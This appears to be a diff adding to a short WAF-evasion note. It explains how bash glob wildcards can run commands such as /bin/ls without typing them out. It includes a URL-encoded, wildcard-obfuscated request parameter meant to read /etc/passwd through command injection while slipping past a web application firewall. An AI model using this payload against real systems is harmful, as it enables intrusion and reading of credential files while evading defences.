@@ -1,3 +1,13 @@
+
+
+BASH standard wildcards => also known as globbing patterns.
+man 7 glob
+
+Not everyone knows that there's lots of bash syntaxes that makes you able to execute system commands just using:
+question mark ?, the forward slash "/", numbers , and letters. 
+
+
+
 demo@demo:~$ /???/?s --help
 Usage: /bin/ls [OPTION]... [FILE]...
 List information about the FILEs (the current directory by default).
@@ -21,6 +31,12 @@ in a POST request.
 /?parm1=cat+/etc/passwd: it will be blocked by the target WAF and your IP will be banned forever and tagged. 
 
 
+/?parm1=%2f???%2f??t%20%27???%2fp??s??
+
+url-encoding
+------------
+%2f = /
+%20 = space 
 
 
 
